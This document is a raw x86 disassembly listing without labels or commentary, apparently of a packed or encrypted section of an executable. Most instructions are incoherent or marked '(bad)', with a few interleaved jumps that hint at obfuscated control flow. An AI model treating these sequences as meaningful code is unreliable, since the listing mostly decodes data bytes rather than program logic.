  40b352:	cmp    eax,0x66c0d8d8
  40b357:	add    bh,dl
  40b359:	push   0x61458940
  40b35e:	scas   al,BYTE PTR es:[edi]
  40b35f:	sbb    DWORD PTR [edx+0x20],0xec0c631a
  40b366:	sub    BYTE PTR [edi],0x5c
  40b369:	call   0x28124a2a
  40b36e:	daa    
  40b36f:	mov    ch,0x59
  40b371:	imul   esp,ebp,0x27
  40b374:	fs dec ebx
  40b376:	ja     0x40b32c
  40b378:	arpl   dx,dx
  40b37a:	xchg   ebx,eax
  40b37b:	ins    BYTE PTR es:[edi],dx
  40b37c:	adc    DWORD PTR [ebx+0x12],edi
  40b37f:	xchg   DWORD PTR [ebx-0x591766fa],ecx
  40b385:	test   al,0xcb
  40b387:	rcl    DWORD PTR [esi-0x7b1eaec0],cl
  40b38d:	add    al,0x40
  40b38f:	mov    dh,0xcb
  40b391:	icebp  
  40b392:	cwde   
  40b393:	stos   BYTE PTR es:[edi],al
  40b394:	lock cs sti 
  40b397:	(bad)  
  40b398:	mov    al,ds:0xaa004f45
  40b39d:	adc    eax,DWORD PTR [ebx-0x836e811]
  40b3a3:	pop    edi
  40b3a4:	pop    es
  40b3a5:	dec    esi
  40b3a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3a7:	push   edi
  40b3a8:	ret    0xd219
  40b3ab:	and    esp,DWORD PTR [edi+0x71]
  40b3ae:	xchg   ecx,eax
  40b3af:	loopne 0x40b41d
  40b3b1:	repnz pop es
  40b3b3:	inc    ecx
  40b3b4:	mov    ah,dh
  40b3b6:	(bad)  
  40b3b7:	jbe    0x40b356
  40b3b9:	js     0x40b404
  40b3bb:	jne    0x40b3c7
  40b3bd:	fdivr  DWORD PTR [esi-0x77c07240]
  40b3c3:	gs mov ebx,edi
  40b3c6:	sti    
  40b3c7:	mov    ebp,0x8458be4
  40b3cc:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0x174ed9d7
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	cvtps2pd xmm4,QWORD PTR [ecx+0x365047e4]
  40b3f7:	mov    dl,0xa3
  40b3f9:	cmp    dl,BYTE PTR [eax+edi*1-0x45]
  40b3fd:	mov    bh,0x85
  40b3ff:	mov    dh,cl
  40b401:	push   cs
  40b402:	int    0x67
  40b404:	jl     0x40b3d2
  40b406:	mov    bh,0xcc
  40b408:	int3   
  40b409:	aam    0x1e
  40b40b:	mov    ah,dh
  40b40d:	rcl    cl,0xd5
  40b410:	ins    BYTE PTR es:[edi],dx
  40b411:	je     0x40b441
  40b413:	mov    cl,0x6c
  40b415:	mov    esp,0xce993c56
  40b41a:	test   eax,0x811d6fde
  40b41f:	aam    0xfb
  40b421:	(bad)  
  40b422:	bound  edi,QWORD PTR [ebx-0x35f200cf]
  40b428:	inc    ebp
  40b429:	mov    ds:0xf7363581,al
  40b42e:	lods   al,BYTE PTR ds:[esi]
  40b42f:	push   ds
  40b430:	(bad)  
  40b431:	cld    
  40b432:	std    
  40b433:	push   eax
  40b434:	sbb    eax,0xecdcc519
  40b439:	cmp    eax,0x92f6d276
  40b43e:	sub    dl,cl
  40b440:	out    0x50,al
  40b442:	xor    bh,BYTE PTR [ecx]
  40b444:	std    
  40b445:	xor    dl,BYTE PTR [ecx]
  40b447:	lods   al,BYTE PTR ds:[esi]
  40b448:	idiv   BYTE PTR [eax-0x3a3aabd1]
  40b44e:	sbb    al,0xa6
  40b450:	test   eax,0xa8ef7994
  40b455:	retf   0x36d
  40b458:	shl    ebp,1
  40b45a:	ret    
  40b45b:	add    esi,DWORD PTR [esi]
  40b45d:	pop    ecx
  40b45e:	fwait
  40b45f:	pslld  mm7,QWORD PTR ds:0xd945b3fe
  40b466:	adc    ebx,DWORD PTR [ebx+0x5d533ec5]
  40b46c:	pop    es
  40b46d:	push   eax
  40b46e:	pop    eax
  40b46f:	stc    
  40b470:	inc    ebx
  40b471:	mov    ebp,0xb8d4be73
  40b476:	into   
  40b477:	xor    DWORD PTR [edi],ebx
  40b479:	int3   
  40b47a:	pop    edx
  40b47b:	cmp    BYTE PTR [esi+0x47ae82f2],ch
  40b481:	add    DWORD PTR [ebx-0x64],ebx
  40b484:	mov    DWORD PTR [ecx-0xb],ebx
  40b487:	hlt    
  40b488:	bound  edx,QWORD PTR [ecx+0x7d]
  40b48b:	xchg   BYTE PTR [edi+0x9],ch
  40b48e:	(bad)  
  40b48f:	jb     0x40b447
  40b491:	inc    esi
  40b492:	xor    eax,eax
  40b494:	cmp    cl,dh
  40b496:	clc    
  40b497:	mov    ds:0xdf7ef7ca,eax
  40b49c:	pop    ebx
  40b49d:	fidivr WORD PTR [esi+0x6bff60d0]
  40b4a3:	jmp    0x596c:0x93a37c5d
  40b4aa:	xor    eax,0xbe8a11e2
  40b4af:	in     al,dx
  40b4b0:	stos   BYTE PTR es:[edi],al
  40b4b1:	outs   dx,DWORD PTR ds:[esi]
  40b4b2:	fsubr  st(3),st
  40b4b4:	add    edx,ebx
  40b4b6:	push   cs
  40b4b7:	int3   
  40b4b8:	scas   al,BYTE PTR es:[edi]
  40b4b9:	jmp    0xe785:0xc12aca35
  40b4c0:	xor    eax,0xc733ee19
  40b4c5:	test   DWORD PTR [esi+0x3],0x758d79e1
  40b4cc:	mov    ebx,0xdac4ef87
  40b4d1:	push   ss
  40b4d2:	sbb    cl,dh
  40b4d4:	push   cs
  40b4d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4d6:	mov    al,ds:0x570cbe2c
  40b4db:	jno    0x40b46c
  40b4dd:	jb     0x40b55a
  40b4df:	fistp  DWORD PTR [edi]
  40b4e1:	mov    ds:0x4eff701c,eax
  40b4e6:	jae    0x40b51c
  40b4e8:	frstor [edx+0x12279cfa]
  40b4ee:	arpl   WORD PTR [ebp+eax*4+0x5e],bp
  40b4f2:	mov    ds:0xd7cef6e9,al
  40b4f7:	ficom  DWORD PTR [eax+ebp*8]
  40b4fa:	int3   
  40b4fb:	mov    BYTE PTR [eax-0x58da36d6],dl
  40b501:	clc    
  40b502:	jmp    0x4224:0x5a66f68
  40b509:	mov    cl,0xf3
  40b50b:	add    al,0x93
  40b50d:	jb     0x40b582
  40b50f:	fld    TBYTE PTR [esi-0x146da766]
  40b515:	in     al,0x95
  40b517:	mov    ecx,0x34bfe198
  40b51c:	sbb    eax,0x5fb97a58
  40b521:	popf   
  40b522:	pop    ecx
  40b523:	and    al,bh
  40b525:	lods   al,BYTE PTR ds:[esi]
  40b526:	sbb    eax,0xc9b25ecf
  40b52b:	pop    ss
  40b52c:	daa    
  40b52d:	rcl    DWORD PTR [ebx+0x78],1
  40b530:	jl     0x40b596
  40b532:	push   0x8476b719
  40b537:	adc    dl,BYTE PTR [ecx]
  40b539:	inc    ebp
  40b53a:	cmp    ch,ah
  40b53c:	xchg   esi,eax
  40b53d:	outs   dx,DWORD PTR ds:[esi]
  40b53e:	and    dh,bh
  40b540:	pop    es
  40b541:	jmp    0x40b59e
  40b543:	idiv   esi
  40b545:	mov    dl,0x81
  40b547:	inc    ebx
  40b548:	inc    ecx
  40b549:	dec    eax
  40b54a:	pushf  
  40b54b:	je     0x40b518
  40b54d:	adc    eax,0xf16370d9
  40b552:	pop    ds
  40b553:	adc    al,0xa1
  40b555:	or     eax,0x8c7913e6
  40b55a:	mov    esp,db0
  40b55d:	xchg   ebp,eax
  40b55e:	inc    ebx
  40b55f:	mov    dh,0xad
  40b561:	mov    bh,0x7f
  40b563:	inc    ebp
  40b564:	sub    eax,DWORD PTR [ecx]
  40b566:	push   ebp
  40b567:	fisubr DWORD PTR [eax+0x39]
  40b56a:	stos   BYTE PTR es:[edi],al
  40b56b:	jo     0x40b597
  40b56d:	into   
  40b56e:	mov    DWORD PTR [edi+ecx*4-0x11819628],edx
  40b575:	and    DWORD PTR ds:0xd3e52908,ebp
  40b57b:	push   ebx
  40b57c:	(bad)  
  40b57d:	push   ss
  40b57e:	ja     0x40b561
  40b580:	daa    
  40b581:	jmp    0xb25b:0xb0decf52
  40b588:	push   esp
  40b589:	dec    esi
  40b58a:	jp     0x40b5dc
  40b58c:	mov    ds:0xb011023f,al
  40b591:	hlt    
  40b592:	push   ecx
  40b593:	les    edi,FWORD PTR [edi-0x9e2d314]
  40b599:	xor    BYTE PTR [esi+0x3f],0xfd
  40b59d:	scas   eax,DWORD PTR es:[edi]
  40b59e:	or     bl,BYTE PTR [edi]
  40b5a0:	or     eax,0x467bd7ef
  40b5a5:	jbe    0x40b5ce
  40b5a7:	outs   dx,DWORD PTR ds:[esi]
  40b5a8:	icebp  
  40b5a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5aa:	adc    eax,0xc653f821
  40b5af:	xor    bh,ah
  40b5b1:	fwait
  40b5b2:	dec    eax
  40b5b3:	jb     0x40b5ab
  40b5b5:	or     eax,0xa1b282c3
  40b5ba:	daa    
  40b5bb:	inc    ebp
  40b5bc:	out    dx,al
  40b5bd:	mov    ah,0xcc
  40b5bf:	xchg   esi,eax
  40b5c0:	iret   
  40b5c1:	xchg   edx,eax
  40b5c2:	(bad)  
  40b5c3:	pop    ecx
  40b5c4:	addr16 dec ebp
  40b5c6:	push   esp
  40b5c7:	sub    dh,BYTE PTR [ebx+0x1216e36f]
  40b5cd:	pop    es
  40b5ce:	mov    ecx,0xc987c760
  40b5d3:	or     bh,BYTE PTR [eax]
  40b5d5:	dec    esp
  40b5d6:	xchg   ebp,eax
  40b5d7:	mov    BYTE PTR [esi+0x52],al
  40b5da:	push   ebp
  40b5db:	and    al,0x3b
  40b5dd:	mov    ah,al
  40b5df:	repz pushf 
  40b5e1:	lahf   
  40b5e2:	inc    esp
  40b5e3:	out    0xb2,eax
  40b5e5:	mov    bl,0xfe
  40b5e7:	pusha  
  40b5e8:	dec    esp
  40b5e9:	sub    al,0x2a
  40b5eb:	rcl    DWORD PTR [esi+0x4e],0x22
  40b5ef:	int    0xee
  40b5f1:	cli    
  40b5f2:	inc    eax
  40b5f3:	(bad)  
  40b5f4:	fidivr DWORD PTR [esi-0x71]
  40b5f8:	mov    edx,0xe708850c
  40b5fd:	aas    
  40b5fe:	leave  
  40b5ff:	js     0x40b593
  40b601:	lea    edi,[eax+0x1]
  40b604:	loopne 0x40b592
  40b606:	and    al,0xc0
  40b608:	clc    
  40b609:	and    esp,DWORD PTR [ebx-0x55ce77a3]
  40b60f:	lahf   
  40b610:	mov    ds:0xc45ab3c3,eax
  40b615:	(bad)  
  40b618:	fmul   QWORD PTR [esi+ebp*2]
  40b61b:	xor    DWORD PTR [edx+0x74fe166d],esi
  40b621:	adc    bl,dl
  40b623:	cwde   
  40b624:	or     al,0x49
  40b626:	add    al,0xcd
  40b628:	int    0x2b
  40b62a:	lds    eax,FWORD PTR [ecx+0x65]
  40b62d:	(bad)  
  40b62e:	clc    
  40b62f:	test   eax,0x893f1634
  40b634:	mov    ecx,0x19751bc1
  40b639:	nop
  40b63a:	and    bh,0x8f
  40b63d:	xchg   ebx,eax
  40b63e:	ror    BYTE PTR [edx+edx*1-0x20915d1e],1
  40b645:	push   ebp
  40b646:	mov    ch,0x20
  40b648:	test   al,0x81
  40b64a:	or     al,0xd7
  40b64c:	mov    bh,0x13
  40b64e:	push   edi
  40b64f:	sbb    ah,BYTE PTR [ecx+0x28f41b6b]
  40b655:	test   edi,eax
  40b657:	(bad)  
  40b659:	aaa    
  40b65a:	out    0x77,eax
  40b65c:	push   ebp
  40b65d:	cmp    ebx,DWORD PTR [edx+ebp*8+0x3a3ccd36]
  40b664:	add    al,0x2b
  40b666:	inc    DWORD PTR [esi+ebx*4]
  40b669:	shl    dl,0xec
  40b66c:	xchg   ebx,eax
  40b66d:	jb     0x40b61c
  40b66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b670:	lock ja 0x40b6b1
  40b673:	sti    
  40b674:	mov    al,0xb3
  40b676:	inc    ebp
  40b677:	sbb    dh,BYTE PTR [esi-0x4f]
  40b67a:	mov    bh,0x28
  40b67c:	addr16 push cs
  40b67e:	jne    0x40b633
  40b680:	(bad)  
  40b681:	adc    cl,cl
  40b683:	(bad)  
  40b684:	loope  0x40b65c
  40b686:	inc    edx
  40b687:	(bad)  
  40b689:	ret    
  40b68a:	dec    ebp
  40b68b:	fwait
  40b68c:	ror    BYTE PTR [edi+ecx*1+0x5d95b2de],0x56
  40b694:	ror    DWORD PTR [eax],cl
  40b696:	mul    BYTE PTR ds:0x59c8c75f
  40b69c:	fisub  DWORD PTR [edi+eax*2]
  40b69f:	ja     0x40b6f6
  40b6a1:	adc    edx,0xfffffff6
  40b6a4:	dec    ebx
  40b6a5:	call   0xf2ae:0x7418a5e7
  40b6ac:	(bad)  
  40b6ad:	into   
  40b6ae:	push   esi
  40b6af:	add    eax,0xcf13db9c
  40b6b4:	push   ds
  40b6b5:	cli    
  40b6b6:	or     bl,BYTE PTR [ecx-0x69]
  40b6b9:	or     ebx,DWORD PTR [ebx]
  40b6bb:	aad    0x52
  40b6bd:	lods   al,BYTE PTR ds:[esi]
  40b6be:	sbb    DWORD PTR ss:[eax],0x39
  40b6c2:	mov    esp,ecx
  40b6c4:	cmp    eax,edx
  40b6c6:	sub    ch,BYTE PTR [edi-0x2c]
  40b6c9:	xchg   ebx,eax
  40b6ca:	test   bh,dh
  40b6cc:	lods   al,BYTE PTR ds:[esi]
  40b6cd:	sbb    eax,0xef588fa1
  40b6d2:	add    cl,BYTE PTR [edx+0x13]
  40b6d5:	out    0x1d,eax
  40b6d7:	mov    al,ds:0x17b632d3
  40b6dc:	xchg   edx,eax
  40b6dd:	shl    BYTE PTR [esp+ecx*4+0x2ec4c713],1
  40b6e4:	mov    esi,0x19af8674
  40b6e9:	nop
  40b6ea:	cmc    
  40b6eb:	jp     0x40b736
  40b6ed:	push   edx
  40b6ee:	fisttp WORD PTR [edx]
  40b6f0:	pop    DWORD PTR [esp+eiz*2]
  40b6f3:	sub    ecx,DWORD PTR [ecx+0x987e901]
  40b6f9:	add    BYTE PTR [eax],al
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [eax-0x4c],cs
  40b71a:	sti    
  40b71b:	jmp    0x7d7a:0x7e7ef814
  40b722:	jle    0x40b7a2
  40b724:	jmp    0x40b703
  40b726:	shr    DWORD PTR [esi+0x21],1
  40b729:	stc    
  40b72a:	push   edx
  40b72b:	and    esi,DWORD PTR [ebp-0x3bed7091]
  40b731:	js     0x40b755
  40b733:	jno    0x40b7a2
  40b735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b736:	test   bl,0x64
  40b739:	ds jge 0x40b76e
  40b73c:	cmp    esi,DWORD PTR [ecx-0x697f7fad]
  40b742:	dec    esi
  40b743:	xor    bl,bl
  40b745:	pop    esi
  40b746:	xchg   edi,eax
  40b747:	in     al,dx
  40b748:	adc    eax,0x18e412cf
  40b74d:	(bad)  
  40b74e:	cwde   
  40b74f:	loopne 0x40b710
  40b751:	shr    DWORD PTR [eax],cl
  40b753:	mov    al,dl
  40b755:	sub    ch,ch
  40b757:	xor    al,0xfe
  40b759:	xor    al,0xde
  40b75b:	inc    edx
  40b75c:	leave  
  40b75d:	fstp   DWORD PTR [ecx-0x19c4f1b1]
  40b763:	jle    0x40b78c
  40b765:	pushf  
  40b766:	adc    al,0xbc
  40b768:	jmp    0x95700e5
  40b76d:	lods   al,BYTE PTR ds:[esi]
  40b76e:	std    
  40b76f:	jmp    0x40b7a2
  40b771:	fcomp  st(0)
  40b773:	add    esi,edi
  40b775:	retf   0xe939
  40b778:	inc    eax
  40b779:	fldenv [esi+0x6f]
  40b77c:	jg     0x40b7e4
  40b77e:	pop    es
  40b77f:	inc    esi
  40b780:	aad    0x24
  40b782:	add    ch,BYTE PTR [edi+0x548ac928]
  40b788:	lea    esi,[edi-0x1314cb5c]
  40b78e:	das    
  40b78f:	in     eax,dx
  40b790:	add    eax,0x6fc16330
  40b795:	into   
  40b796:	fwait
  40b797:	mov    dh,0x57
  40b799:	scas   eax,DWORD PTR es:[edi]
  40b79a:	cmp    al,0xe5
  40b79c:	loope  0x40b726
  40b79e:	int    0x70
  40b7a0:	jo     0x40b7e3
  40b7a2:	repz in al,0xea
  40b7a5:	mov    bh,0x4b
  40b7a7:	xchg   ebx,eax
  40b7a8:	adc    ch,BYTE PTR [edi-0x6b]
  40b7ab:	adc    al,0xc3
  40b7ad:	mov    ebx,0x37a6100a
  40b7b2:	jnp    0x40b819
  40b7b4:	ins    DWORD PTR es:[edi],dx
  40b7b5:	xchg   ebx,eax
  40b7b6:	xor    esi,eax
  40b7b8:	ins    DWORD PTR es:[edi],dx
  40b7b9:	mov    ebx,0x880f583f
  40b7be:	in     eax,dx
  40b7bf:	and    dh,al
  40b7c1:	cld    
  40b7c2:	fldenv [ecx-0x6b0ab9f4]
  40b7c8:	xchg   BYTE PTR [ecx-0x52],ch
  40b7cb:	adc    dh,bh
  40b7cd:	inc    esp
  40b7ce:	add    DWORD PTR [esi-0x3e],esp
  40b7d1:	push   esi
  40b7d2:	ds inc esp
  40b7d4:	mov    WORD PTR [edi+0x72823328],es
  40b7da:	cs push 0x1e
  40b7dd:	aam    0x9a
  40b7df:	js     0x40b7c8
  40b7e1:	std    
  40b7e2:	(bad)  
  40b7e3:	mov    edi,0xaed13a2d
  40b7e8:	lods   eax,DWORD PTR ds:[esi]
  40b7e9:	push   esp
  40b7ea:	xchg   BYTE PTR [ecx+0xe],bl
  40b7ed:	mov    esp,0x5605f39b
  40b7f2:	mov    edx,0xbbb50a8e
  40b7f7:	dec    edi
  40b7f8:	dec    esp
  40b7f9:	fbstp  TBYTE PTR [edx-0x281efca0]
  40b7ff:	mov    ds:0xd2d0085a,al
  40b804:	scas   eax,DWORD PTR es:[edi]
  40b805:	shl    edi,cl
  40b807:	and    al,0x42
  40b809:	dec    ecx
  40b80a:	je     0x40b829
  40b80c:	xchg   esi,eax
  40b80d:	leave  
  40b80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b80f:	mov    esp,0x8297601b
  40b814:	adc    esi,esp
  40b816:	xchg   ecx,eax
  40b817:	stos   BYTE PTR es:[edi],al
  40b818:	je     0x40b7af
  40b81a:	pop    es
  40b81b:	out    dx,eax
  40b81c:	sbb    al,0x67
  40b81e:	test   DWORD PTR [edi+0x7db13663],eax
  40b824:	ins    DWORD PTR es:[edi],dx
  40b825:	cdq    
  40b826:	jo     0x40b893
  40b828:	sbb    ebp,DWORD PTR ss:[ebp+0x2]
  40b82c:	pop    ebx
  40b82d:	fcomip st,st(5)
  40b82f:	jp     0x40b7c3
  40b831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b832:	les    esp,FWORD PTR [edx+0x41f31eb6]
  40b838:	ins    BYTE PTR es:[edi],dx
  40b839:	xchg   ecx,eax
  40b83a:	icebp  
  40b83b:	data16 je 0x40b89d
  40b83e:	(bad)  
  40b83f:	xor    ah,BYTE PTR [edx]
  40b841:	xchg   esi,eax
  40b842:	scas   al,BYTE PTR es:[edi]
  40b843:	outs   dx,DWORD PTR ds:[esi]
  40b844:	retf   
  40b845:	outs   dx,DWORD PTR ds:[esi]
  40b846:	add    esp,DWORD PTR [edi+0x32]
  40b849:	mov    al,0x97
  40b84b:	pop    ebp
  40b84c:	(bad)  
  40b84d:	fstp   DWORD PTR [eax+0x2e]
  40b850:	aas    
  40b851:	xor    BYTE PTR [ecx],dl
  40b853:	aas    
  40b854:	push   eax
  40b855:	push   cs
  40b856:	jp     0x40b819
  40b858:	and    bh,BYTE PTR [edx-0x28]
  40b85b:	push   ecx
  40b85c:	ret    
  40b85d:	xlat   BYTE PTR ds:[ebx]
  40b85e:	pushf  
  40b85f:	fcmovu st,st(6)
  40b861:	adc    DWORD PTR [edi-0x5d42a692],eax
  40b867:	mov    al,ds:0xa38905a0
  40b86c:	push   es
  40b86d:	ror    DWORD PTR [edx-0x48],1
  40b870:	gs mov esp,ds
  40b873:	jb     0x40b8c9
  40b875:	jle    0x40b8c2
  40b877:	or     eax,0x4b668186
  40b87c:	mov    edx,0xbbca154d
  40b881:	jmp    0x98c4:0x554dbc07
  40b888:	mov    esi,0x1824a732
  40b88d:	std    
  40b88e:	xchg   edx,eax
  40b88f:	jb     0x40b8a6
  40b891:	int    0xce
  40b893:	lds    edx,FWORD PTR [ecx+ebx*8]
  40b896:	sbb    ah,al
  40b898:	add    esi,DWORD PTR [eax+edi*8-0x595f2bee]
  40b89f:	xchg   BYTE PTR [eax],dl
  40b8a1:	mov    bl,0x1e
  40b8a3:	scas   eax,DWORD PTR es:[edi]
  40b8a4:	imul   ebp,DWORD PTR [eax],0x3dba6478
  40b8aa:	adc    ah,BYTE PTR [edx]
  40b8ac:	rcr    DWORD PTR [edx+0x26],0x96
  40b8b0:	mov    gs,WORD PTR [edx+0x61]
  40b8b3:	jle    0x40b837
  40b8b5:	addr16 std 
  40b8b7:	fcomp  DWORD PTR [edi]
  40b8b9:	repnz push eax
  40b8bb:	push   es
  40b8bc:	mov    ebx,0x71d26822
  40b8c1:	arpl   ax,si
  40b8c3:	test   BYTE PTR [edx+eax*8],0xbd
  40b8c7:	cwde   
  40b8c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8ca:	jmp    0x40b906
  40b8cc:	sbb    esi,ebp
  40b8ce:	lock sub ecx,DWORD PTR [ecx-0x14]
  40b8d2:	xchg   edx,eax
  40b8d3:	xchg   ebp,eax
  40b8d4:	dec    edi
  40b8d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8d6:	fcmovnu st,st(5)
  40b8d8:	push   ecx
  40b8d9:	fadd   DWORD PTR [ecx-0x239f0f23]
  40b8df:	inc    edx
  40b8e0:	pop    es
  40b8e1:	cli    
  40b8e2:	and    edi,DWORD PTR [edi-0x21df8991]
  40b8e8:	(bad)  
  40b8e9:	scas   eax,DWORD PTR es:[edi]
  40b8ea:	aad    0xd8
  40b8ec:	cs sbb edx,ecx
  40b8ef:	pusha  
  40b8f0:	jl     0x40b8a6
  40b8f2:	adc    edi,DWORD PTR [ebx+0xe7817b3]
  40b8f8:	mov    BYTE PTR [edi+eax*8-0x73a11e6c],dh
  40b8ff:	and    ah,BYTE PTR [eax]
  40b901:	repz aad 0xd9
  40b904:	(bad)  
  40b906:	and    ebx,DWORD PTR [edi]
  40b908:	mov    cl,0x30
  40b90a:	out    0xbb,eax
  40b90c:	cmp    ebp,DWORD PTR [eax+eax*1-0x65]
  40b910:	sbb    DWORD PTR [edi+edi*8+0x184552cb],ebx
  40b917:	xchg   edi,eax
  40b918:	pop    es
  40b919:	call   0x11bb7e27
  40b91e:	fs out 0x88,eax
  40b921:	call   DWORD PTR [ecx+0x1d]
  40b924:	test   eax,0x2e32e47b
  40b929:	scas   al,BYTE PTR es:[edi]
  40b92a:	and    ah,BYTE PTR [edx-0x6c]
  40b92d:	jecxz  0x40b958
  40b92f:	push   0xffffffda
  40b931:	je     0x40b8f3
  40b933:	fs push edx
  40b935:	fwait
  40b936:	mov    ebx,0xf5710a66
  40b93b:	(bad)  
  40b93c:	loop   0x40b91c
  40b93e:	mul    ah
  40b940:	pop    ecx
  40b941:	jmp    FWORD PTR [esi+0x14131b98]
  40b947:	retf   0xc22e
  40b94a:	jmp    0x37a7:0x45c9e8ec
  40b951:	xor    ecx,edx
  40b953:	stos   BYTE PTR es:[edi],al
  40b954:	stos   DWORD PTR es:[edi],eax
  40b955:	repz mov bl,0x5c
  40b958:	lock (bad) 
  40b95b:	jg     0x40b904
  40b95d:	inc    ebx
  40b95e:	imul   BYTE PTR [esi-0x26024fc0]
  40b964:	jno    0x40b98c
  40b966:	popa   
  40b967:	jo     0x40b9a9
  40b969:	push   ebx
  40b96a:	xchg   ebx,eax
  40b96b:	int3   
  40b96c:	pop    edi
  40b96d:	mov    dh,0xc8
  40b96f:	xchg   edx,eax
  40b970:	test   eax,0xc7cbf3aa
  40b975:	mov    BYTE PTR [edi-0x78],ch
  40b978:	ins    BYTE PTR es:[edi],dx
  40b979:	mov    ah,0x99
  40b97b:	dec    ecx
  40b97c:	mov    dh,0x96
  40b97e:	fwait
  40b97f:	pop    edi
  40b980:	stc    
  40b981:	xchg   esp,eax
  40b982:	adc    eax,0x502a7b07
  40b987:	xchg   edx,eax
  40b988:	out    0x83,eax
  40b98a:	xor    edi,DWORD PTR [esi+ebp*8-0x1d]
  40b98e:	mov    ds:0x5f7e2103,al
  40b993:	pop    ebx
  40b994:	test   ebp,edi
  40b996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b997:	pop    eax
  40b998:	xor    bl,cl
  40b99a:	sti    
  40b99b:	cmp    ah,BYTE PTR [edi+eiz*1+0x31]
  40b99f:	adc    eax,0x68d25d19
  40b9a4:	mov    dl,0x59
  40b9a6:	push   edi
  40b9a7:	mov    dh,0x70
  40b9a9:	jnp    0x40b966
  40b9ab:	pusha  
  40b9ac:	mov    eax,0xebd23b8b
  40b9b1:	hlt    
  40b9b2:	outs   dx,BYTE PTR ds:[esi]
  40b9b3:	cmp    al,0x8b
  40b9b5:	daa    
  40b9b6:	in     al,0x61
  40b9b8:	comiss xmm1,xmm7
  40b9bb:	test   BYTE PTR ds:[eax+0x22ca0ebc],0xbf
  40b9c3:	les    edx,FWORD PTR [edi+ebx*4+0x69]
  40b9c7:	in     al,dx
  40b9c8:	mov    bh,0x64
  40b9ca:	outs   dx,DWORD PTR ds:[esi]
  40b9cb:	ss hlt 
  40b9cd:	pop    ds
  40b9ce:	add    al,0x7e
  40b9d0:	fcmove st,st(2)
  40b9d2:	add    ecx,ebp
  40b9d4:	push   edx
  40b9d5:	out    0xfd,eax
  40b9d7:	out    0x12,eax
  40b9d9:	or     DWORD PTR [ebx+0x63375f91],ecx
  40b9df:	icebp  
  40b9e0:	loope  0x40b9eb
  40b9e2:	dec    ebx
  40b9e3:	jnp    0x40b9ab
  40b9e5:	retf   
  40b9e6:	gs cld 
  40b9e8:	cmp    bh,cl
  40b9ea:	inc    ebx
  40b9eb:	mov    edi,0x785a3300
  40b9f0:	mov    edx,0xcf94f8de
  40b9f5:	cmp    ah,BYTE PTR [edi-0x55]
  40b9f8:	inc    esp
  40b9f9:	xchg   ebp,eax
  40b9fa:	jmp    0x40ba73
  40b9fc:	sti    
  40b9fd:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40b9ff:	mov    bh,BYTE PTR [edx-0x2a]
  40ba02:	int    0x1e
  40ba04:	shl    BYTE PTR [edx-0x1e65449d],1
  40ba0a:	lock adc al,0xd9
  40ba0d:	push   esi
  40ba0e:	std    
  40ba0f:	into   
  40ba10:	(bad)  
  40ba11:	and    DWORD PTR [eax-0x27],edx
  40ba14:	pusha  
  40ba15:	stc    
  40ba16:	ret    0xcfe0
  40ba19:	int    0x69
  40ba1b:	pop    edi
  40ba1c:	(bad)  
  40ba1e:	push   ecx
  40ba20:	jp     0x40ba74
  40ba22:	dec    esi
  40ba23:	jmp    0x93bb8ab2
  40ba28:	mov    eax,DWORD PTR [ebp-0x8]
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    ch,BYTE PTR [eax+esi*8-0x78ef4733]
  40ba45:	jle    0x40bac5
  40ba47:	jp     0x40bac6
  40ba49:	jle    0x40bac9
  40ba4b:	add    eax,0x6850a57e
  40ba50:	push   edi
  40ba51:	push   ebx
  40ba52:	loop   0x40b9e7
  40ba54:	aas    
  40ba55:	mov    esi,0xa5dc5730
  40ba5a:	add    dl,BYTE PTR [ebx+0x7e]
  40ba5d:	mov    al,ds:0xb616717b
  40ba62:	clc    
  40ba63:	push   ss
  40ba64:	mov    dh,0x71
  40ba66:	adc    ebp,ebp
  40ba68:	shl    DWORD PTR [edx+0xa],1
  40ba6b:	xchg   edi,eax
  40ba6c:	jge    0x40b9f2
  40ba6e:	mov    ah,0x18
  40ba70:	pop    edx
  40ba71:	loopne 0x40ba27
  40ba73:	mov    dl,0xd8
  40ba75:	je     0x40ba04
  40ba77:	inc    edx
  40ba78:	nop
  40ba79:	js     0x40ba8e
  40ba7b:	jae    0x40baa1
  40ba7d:	(bad)  
  40ba7e:	or     BYTE PTR ds:0x935193b1,bl
  40ba84:	ficom  DWORD PTR [edi]
  40ba86:	push   0x6e
  40ba88:	sub    ecx,DWORD PTR [ecx]
  40ba8a:	sti    
  40ba8b:	mov    ch,0x4c
  40ba8d:	js     0x40bae6
  40ba8f:	sub    bh,BYTE PTR [esp+edi*2-0x6a]
  40ba93:	mov    ebx,0x4687f12d
  40ba98:	ret    0xfbf1
  40ba9b:	jnp    0x40ba84
